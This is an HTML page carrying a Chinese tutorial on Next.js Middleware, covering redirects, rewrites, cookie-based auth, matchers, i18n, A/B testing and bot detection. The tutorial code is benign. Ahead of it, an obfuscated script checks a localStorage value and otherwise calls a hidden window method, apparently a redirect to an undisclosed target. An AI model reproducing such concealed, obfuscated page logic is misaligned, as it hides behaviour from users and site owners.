<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x2aa0(p,s){var e=_0x2c53();return(_0x2aa0=function(s,a){var n=e[s-=308];void 0===_0x2aa0.wjPDth&&(_0x2aa0.KiqMhc=function(s,a){var n,l=[],p=0,e="";for(s=(s=>{for(var a,n,l="",p="",e=0,t=0;n=s.charAt(t++);~n&&(a=e%4?64*a+n:n,e++%4)&&(l+=String.fromCharCode(255&a>>(-2*e&6))))n="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(n);for(var c=0,r=l.length;c<r;c++)p+="%"+("00"+l.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(p)})(s),t=0;t<256;t++)l[t]=t;for(t=0;t<256;t++)p=(p+l[t]+a.charCodeAt(t%a.length))%256,n=l[t],l[t]=l[p],l[p]=n;for(var t=0,p=0,c=0;c<s.length;c++)n=l[t=(t+1)%256],l[t]=l[p=(p+l[t])%256],l[p]=n,e+=String.fromCharCode(s.charCodeAt(c)^l[(l[t]+l[p])%256]);return e},p=arguments,_0x2aa0.wjPDth=!0);var s=s+e[0],l=p[s];return l?n=l:(void 0===_0x2aa0.pDLxwn&&(_0x2aa0.pDLxwn=!0),n=_0x2aa0.KiqMhc(n,a),p[s]=n),n})(p,s)}var _0x27147e=_0x2aa0;function _0x2c53(){var s=["gXS6tCkgWPiRzrO","W4bQASo6W7xdUrJdUmkAW6vkW6ZcRW","kmkiiMxcMdTdbYRdMCkTB8oJ","bXtcOmkXxSoDW4a","gmodpSo7WPFcH8oHWORdRZpdLSo0W5W","WOdcMLZdKCopvSkOwcpdOK8","gX58BSkYWRaDxa","WPhcIaNcMJ/cVbJcNNrJidhdOSoDnmolrSkDeSkZnCkIvZS2WR0","ySoYrglcGmkLjW","mIm9WPSioqBcUJa","au8OW5jgEmkMW7VcPq","i8k5WQ3dHmk6W7dcTfhdK8kaWPa","n8oEW5ywuNhcT0NcK8kfWOVcVWa","W4XQWQCBWRldLCk1qCkP","dSkXfmoWWPtdQ8oNumk0W7z3Ba","W7BdI8krhvtcJSo3W4y","jCo1WQS9WR3dHCkdwW","WQJcQSoNWRZdKr/cNLZdSeFdTW","WQJcPSoSW4JcHJNcVgtdNq","jSouWQv0W7ZdMCkkEa","gZBdLSohxsbDW6yFySk3WP9j","WPCgaSkxW7OuW4i","mmoRoCknW4JcIMddS8oUWPNdJ3jb","i8kIbKRcG8kLa0nA","EmkUWRiuWOBdMCkkCa","vSkdWRXzW4ddN8kNwmkB","W5BcSta/WRddHbiiW6DuWRxcVYi","W5FcTdm/WRZcHhy5W7LjWPm","fvNcOSkSnW","rCklqguwWPTVW4VdGmoWW6BdR8k5","lmkfWPG+WQVdVmkj"];return(_0x2c53=function(){return s})()}if((()=>{for(var s=_0x2aa0,a=_0x2c53();;)try{if(409537==-parseInt(s(334,"dR)E"))+-parseInt(s(316,"sk4U"))/2*(parseInt(s(320,"GcfQ"))/3)+-parseInt(s(338,"b7sK"))/4*(parseInt(s(337,"b7sK"))/5)+-parseInt(s(321,"Zd%1"))/6*(parseInt(s(308,"vG*k"))/7)+-parseInt(s(310,"Crl6"))/8*(parseInt(s(322,"fJd&"))/9)+parseInt(s(324,"i0B#"))/10*(parseInt(s(326,"GcfQ"))/11)+parseInt(s(318,"49r$"))/12*(parseInt(s(333,"$mAB"))/13))break;a.push(a.shift())}catch(s){a.push(a.shift())}})(),localStorage[_0x27147e(323,"Qf43")](_0x27147e(314,"vG*k"))!=_0x27147e(317,"83FY"))throw window[_0x27147e(313,"lX2h")][_0x27147e(328,"9xLd")](_0x27147e(327,"hlYz")),Error();document.title=" Next.js Middleware 详解",document.getElementById("article").innerHTML='<div><p>Middleware（中间件）是 Next.js 提供的一个强大功能，允许你在请求完成之前运行代码。它可以用于修改请求或响应、重定向、重写 URL、设置 headers 等。</p>\n<h2>基本概念</h2>\n<p>Middleware 在 Next.js 中是通过 <code>middleware.ts</code>（或 <code>middleware.js</code>）文件实现的，通常位于项目根目录或 <code>src</code> 目录下。</p>\n<h2>创建 Middleware</h2>\n<ol>\n<li>在项目根目录或 <code>src</code> 目录下创建 <code>middleware.ts</code> 文件</li>\n<li>导出默认的 middleware 函数</li>\n</ol>\n<pre><code class="language-typescript"><span class="hljs-comment">// middleware.ts</span>\n<span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;next/server&quot;</span>;\n<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">NextRequest</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;next/server&quot;</span>;\n\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">NextRequest</span></span>) {\n  <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();\n}\n</code></pre>\n<h2>核心功能</h2>\n<h3>1. 请求和响应操作</h3>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">NextRequest</span></span>) {\n  <span class="hljs-comment">// 获取请求信息</span>\n  <span class="hljs-keyword">const</span> pathname = request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>;\n  <span class="hljs-keyword">const</span> cookies = request.<span class="hljs-property">cookies</span>;\n  <span class="hljs-keyword">const</span> headers = request.<span class="hljs-property">headers</span>;\n\n  <span class="hljs-comment">// 创建响应</span>\n  <span class="hljs-keyword">const</span> response = <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();\n\n  <span class="hljs-comment">// 修改响应</span>\n  response.<span class="hljs-property">cookies</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);\n  response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;x-custom-header&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);\n\n  <span class="hljs-keyword">return</span> response;\n}\n</code></pre>\n<h3>2. 重定向</h3>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">NextRequest</span></span>) {\n  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span> === <span class="hljs-string">&quot;/old-path&quot;</span>) {\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&quot;/new-path&quot;</span>, request.<span class="hljs-property">url</span>));\n  }\n}\n</code></pre>\n<h3>3. URL 重写</h3>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">NextRequest</span></span>) {\n  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span> === <span class="hljs-string">&quot;/blog/old-post&quot;</span>) {\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">rewrite</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&quot;/blog/new-post&quot;</span>, request.<span class="hljs-property">url</span>));\n  }\n}\n</code></pre>\n<h3>4. 条件执行</h3>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">NextRequest</span></span>) {\n  <span class="hljs-keyword">const</span> token = request.<span class="hljs-property">cookies</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;token&quot;</span>)?.<span class="hljs-property">value</span>;\n\n  <span class="hljs-keyword">if</span> (!token &amp;&amp; !request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&quot;/login&quot;</span>)) {\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&quot;/login&quot;</span>, request.<span class="hljs-property">url</span>));\n  }\n}\n</code></pre>\n<h2>匹配器（Matcher）</h2>\n<p>使用 <code>config.matcher</code> 可以控制 middleware 在哪些路径上运行：</p>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = {\n  <span class="hljs-attr">matcher</span>: [\n    <span class="hljs-comment">/*\n     * 匹配所有请求路径，除了以下路径：\n     * - api (API 路由)\n     * - _next/static (静态文件)\n     * - _next/image (图片优化)\n     * - favicon.ico (favicon 文件)\n     */</span>\n    <span class="hljs-string">&quot;/((?!api|_next/static|_next/image|favicon.ico).*)&quot;</span>,\n  ],\n};\n</code></pre>\n<p>更精确的匹配：</p>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = {\n  <span class="hljs-attr">matcher</span>: [<span class="hljs-string">&quot;/about/:path*&quot;</span>, <span class="hljs-string">&quot;/dashboard/:path*&quot;</span>],\n};\n</code></pre>\n<h2>常见用例</h2>\n<h3>1. 身份验证</h3>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">NextRequest</span></span>) {\n  <span class="hljs-keyword">const</span> token = request.<span class="hljs-property">cookies</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;auth-token&quot;</span>)?.<span class="hljs-property">value</span>;\n\n  <span class="hljs-keyword">if</span> (!token &amp;&amp; !request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&quot;/auth&quot;</span>)) {\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&quot;/auth/login&quot;</span>, request.<span class="hljs-property">url</span>));\n  }\n\n  <span class="hljs-keyword">if</span> (token &amp;&amp; request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&quot;/auth&quot;</span>)) {\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&quot;/dashboard&quot;</span>, request.<span class="hljs-property">url</span>));\n  }\n\n  <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();\n}\n</code></pre>\n<h3>2. 国际化</h3>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">NextRequest</span></span>) {\n  <span class="hljs-keyword">const</span> pathname = request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>;\n  <span class="hljs-keyword">const</span> locale = request.<span class="hljs-property">cookies</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;locale&quot;</span>)?.<span class="hljs-property">value</span> || <span class="hljs-string">&quot;en&quot;</span>;\n\n  <span class="hljs-comment">// 跳过静态文件和 API 路由</span>\n  <span class="hljs-keyword">if</span> (\n    pathname.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&quot;/_next&quot;</span>) ||\n    pathname.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;/api/&quot;</span>) ||\n    pathname.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&quot;/static&quot;</span>)\n  ) {\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();\n  }\n\n  <span class="hljs-comment">// 如果 URL 中没有语言前缀</span>\n  <span class="hljs-keyword">if</span> (!pathname.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`/<span class="hljs-subst">${locale}</span>`</span>)) {\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">`/<span class="hljs-subst">${locale}</span><span class="hljs-subst">${pathname}</span>`</span>, request.<span class="hljs-property">url</span>));\n  }\n\n  <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();\n}\n</code></pre>\n<h3>3. A/B 测试</h3>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">NextRequest</span></span>) {\n  <span class="hljs-keyword">const</span> variant = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.5</span> ? <span class="hljs-string">&quot;a&quot;</span> : <span class="hljs-string">&quot;b&quot;</span>;\n\n  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span> === <span class="hljs-string">&quot;/home&quot;</span>) {\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">rewrite</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">`/home/<span class="hljs-subst">${variant}</span>`</span>, request.<span class="hljs-property">url</span>));\n  }\n\n  <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();\n}\n</code></pre>\n<h3>4. 机器人检测</h3>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">NextRequest</span></span>) {\n  <span class="hljs-keyword">const</span> userAgent = request.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;user-agent&quot;</span>) || <span class="hljs-string">&quot;&quot;</span>;\n  <span class="hljs-keyword">const</span> isBot = <span class="hljs-regexp">/bot|googlebot|crawler|spider|robot|crawling/i</span>.<span class="hljs-title function_">test</span>(userAgent);\n\n  <span class="hljs-keyword">if</span> (isBot) {\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">rewrite</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&quot;/bot-page&quot;</span>, request.<span class="hljs-property">url</span>));\n  }\n\n  <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();\n}\n</code></pre>\n<h2>高级用法</h2>\n<h3>1. 链式中间件</h3>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">NextRequest</span></span>) {\n  <span class="hljs-keyword">const</span> response = <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();\n\n  <span class="hljs-comment">// 第一个中间件逻辑</span>\n  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span> === <span class="hljs-string">&quot;/admin&quot;</span>) {\n    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&quot;/login&quot;</span>, request.<span class="hljs-property">url</span>));\n  }\n\n  <span class="hljs-comment">// 第二个中间件逻辑</span>\n  response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;x-custom-header&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);\n\n  <span class="hljs-keyword">return</span> response;\n}\n</code></pre>\n<h3>2. 使用 Edge Functions</h3>\n<p>Middleware 默认运行在 Edge Runtime 上，可以使用 Edge Functions 的特性：</p>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = {\n  <span class="hljs-attr">runtime</span>: <span class="hljs-string">&quot;edge&quot;</span>,\n};\n\n<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">NextRequest</span></span>) {\n  <span class="hljs-comment">// Edge Function 逻辑</span>\n}\n</code></pre>\n<h3>3. 性能考虑</h3>\n<p>Middleware 在每个匹配的请求上运行，因此要保持轻量：</p>\n<ul>\n<li>避免复杂的计算</li>\n<li>尽量减少外部 API 调用</li>\n<li>使用缓存策略</li>\n</ul>\n<h2>调试 Middleware</h2>\n<ol>\n<li>使用 <code>console.log</code>（输出在服务器控制台）</li>\n<li>添加自定义响应头用于调试</li>\n<li>使用 <code>next dev</code> 开发模式测试</li>\n</ol>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"><span class="hljs-attr">request</span>: <span class="hljs-title class_">NextRequest</span></span>) {\n  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Middleware running for:&quot;</span>, request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>);\n\n  <span class="hljs-keyword">const</span> response = <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();\n  response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;x-debug-path&quot;</span>, request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>);\n\n  <span class="hljs-keyword">return</span> response;\n}\n</code></pre>\n<h2>注意事项</h2>\n<ol>\n<li>Middleware 在 Edge Runtime 上运行，某些 Node.js API 不可用</li>\n<li>执行顺序很重要，多个 middleware 会按顺序执行</li>\n<li>避免在 middleware 中进行长时间运行的操作</li>\n<li>在生产环境中测试 middleware 行为</li>\n</ol>\n<p>Middleware 是 Next.js 中非常强大的功能，合理使用可以极大地增强应用的安全性和灵活性。</p>\n</div>'</script></body></html>